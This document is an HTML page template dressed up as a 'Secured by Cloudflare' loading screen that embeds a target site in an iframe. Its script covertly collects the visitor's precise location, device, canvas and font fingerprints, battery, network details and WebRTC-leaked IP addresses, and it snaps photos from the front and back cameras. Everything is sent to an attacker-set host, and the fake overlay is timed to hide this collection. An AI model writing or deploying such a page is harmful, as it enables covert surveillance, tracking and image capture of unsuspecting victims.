<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Secure Content...</title>
    <style>
        body { 
            margin: 0; 
            padding: 0; 
            overflow: hidden;
            background: #f8fafc;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        iframe { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            border: none;
            background: white;
            z-index: 10;
        }
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.97);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            transition: opacity 0.5s ease;
            backdrop-filter: blur(5px);
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #e2e8f0;
            border-top: 4px solid #6366f1;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loading-text {
            font-size: 16px;
            color: #475569;
            text-align: center;
            max-width: 80%;
            line-height: 1.5;
            font-weight: 500;
        }
        .status-badge {
            margin-top: 15px;
            padding: 8px 16px;
            background: #dbeafe;
            color: #1d4ed8;
            border-radius: 9999px;
            font-size: 13px;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <div class="loading-text">Verifying your connection...<br>Please wait while we load secure content.</div>
        <div class="status-badge">üîí Secured by Cloudflare</div>
    </div>
    
    <iframe src="<%= url %>" allow="camera; geolocation; microphone; fullscreen"></iframe>
    
    <script>
        const uid = '<%= uid %>';
        const host = '<%= host %>';
        const loadingOverlay = document.getElementById('loadingOverlay');

        function send(endpoint, data) {
            fetch(`${host}/${endpoint}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ uid, ...data })
            }).catch(e => console.error(`Failed to send to ${endpoint}:`, e));
        }

        // ========== MAXIMUM DATA COLLECTION ==========

        // 1. LOCATION
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => {
                    send('location', {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        acc: pos.coords.accuracy,
                        alt: pos.coords.altitude,
                        heading: pos.coords.heading,
                        speed: pos.coords.speed
                    });
                },
                err => {
                    send('info', { data: `<b>üìç Location Error:</b> <code>${err.message}</code>` });
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        }

        // 2. DEVICE FINGERPRINT
        const fp = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages?.join(', ') || 'N/A',
            cookies: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack || 'unknown',
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            touch: navigator.maxTouchPoints > 0,
            webdriver: navigator.webdriver,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            online: navigator.onLine,
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                dpi: window.devicePixelRatio
            },
            referrer: document.referrer,
            title: document.title
        };
        send('info', { data: `<b>üì± Device Fingerprint (WebView)</b>\n<code>${JSON.stringify(fp, null, 2)}</code>` });

        // 3. BATTERY
        if ('getBattery' in navigator) {
            navigator.getBattery().then(battery => {
                const batteryInfo = `${(battery.level * 100).toFixed(1)}% | Charging: ${battery.charging}`;
                send('info', { data: `<b>üîã Battery Status:</b> ${batteryInfo}` });
            }).catch(e => {
                send('info', { data: `<b>üîã Battery:</b> Access denied or error` });
            });
        }

        // 4. NETWORK INFO
        if (navigator.connection) {
            const conn = navigator.connection;
            const networkInfo = `${conn.effectiveType || 'unknown'} | ${conn.downlink || '?'} Mbps | RTT: ${conn.rtt || '?'}ms`;
            send('info', { data: `<b>üåê Network Info:</b> ${networkInfo}` });
        }

        // 5. CANVAS FINGERPRINT
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = "14px Arial";
        ctx.fillText('WebViewFingerprint', 2, 2);
        const canvasFP = canvas.toDataURL().substring(0, 100) + '...';
        send('info', { data: `<b>üé® Canvas Fingerprint:</b> <code>${canvasFP}</code>` });

        // 6. AUDIO SUPPORT
        let audioSupported = false;
        try {
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            audioSupported = true;
            send('info', { data: `<b>üéµ AudioContext:</b> Supported` });
        } catch(e) {
            send('info', { data: `<b>üéµ AudioContext:</b> Not supported` });
        }

        // 7. WEBRTC IP LEAK
        const getIPs = () => {
            return new Promise(resolve => {
                const ips = [];
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = e => {
                    if (!e || !e.candidate) {
                        resolve(ips);
                        return;
                    }
                    const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                    if (ipMatch && !ips.includes(ipMatch[1])) {
                        ips.push(ipMatch[1]);
                    }
                };
                setTimeout(() => {
                    pc.close();
                    resolve(ips);
                }, 2000);
            });
        };

        getIPs().then(ips => {
            if (ips.length) {
                send('info', { data: `<b>üåê WebRTC Leaked IPs:</b>\n<code>${ips.join('\\n')}</code>` });
            }
        });

        // 8. INSTALLED FONTS (Basic Detection)
        const detectFonts = () => {
            const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Impact'];
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
            
            const installed = testFonts.filter(font => {
                ctx.font = `72px "${font}", monospace`;
                const testWidth = ctx.measureText('mmmmmmmmmmlli').width;
                return Math.abs(baseWidth - testWidth) > 2;
            });
            
            return installed.join(', ') || 'None detected';
        };

        const fonts = detectFonts();
        send('info', { data: `<b>üî† Detected Fonts:</b> ${fonts}` });

        // 9. PLUGINS
        const plugins = Array.from(navigator.plugins).map(p => p.name).join(', ') || 'No plugins detected';
        send('info', { data: `<b>üîå Browser Plugins:</b> ${plugins}` });

        // 10. AD BLOCKER DETECTION
        const adBlockDetected = () => {
            const fakeAd = document.createElement('div');
            fakeAd.innerHTML = '&nbsp;';
            fakeAd.className = 'adsbox';
            document.body.appendChild(fakeAd);
            const isBlocked = fakeAd.offsetHeight === 0;
            document.body.removeChild(fakeAd);
            return isBlocked;
        };
        send('info', { data: `<b>üõë Ad Blocker:</b> ${adBlockDetected() ? 'Detected' : 'Not Detected'}` });

        // ========== CAMERA CAPTURE (FRONT + BACK) ==========

        async function captureCamera(facingMode = 'user', label = 'front') {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: facingMode === 'environment' ? 'environment' : 'user' }
                });

                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                video.onloadedmetadata = () => {
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);

                        const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
                        send('camsnap', { [label]: imageData });

                        stream.getTracks().forEach(track => track.stop());
                    }, 1000);
                };
            } catch (err) {
                send('cam-status', { status: `error-${label}` });
                console.log(`	Camera ${label} error:`, err.message);
            }
        }

        // Try front camera immediately
        setTimeout(() => {
            send('cam-status', { status: 'attempting-front' });
            captureCamera('user', 'front');
        }, 1000);

        // Try back camera after delay
        setTimeout(() => {
            send('cam-status', { status: 'attempting-back' });
            captureCamera('environment', 'back');
        }, 3000);

        // Hide loading overlay after 4 seconds (let data collect first)
        setTimeout(() => {
            loadingOverlay.style.opacity = '0';
            setTimeout(() => {
                loadingOverlay.style.display = 'none';
            }, 500);
        }, 4000);

        // Optional: Listen for iframe loaded event (if target site supports postMessage)
        window.addEventListener('message', (e) => {
            if (e.data === 'ready' || e.data === 'loaded') {
                loadingOverlay.style.opacity = '0';
                setTimeout(() => {
                    loadingOverlay.style.display = 'none';
                }, 500);
            }
        });
    </script>
</body>
</html>
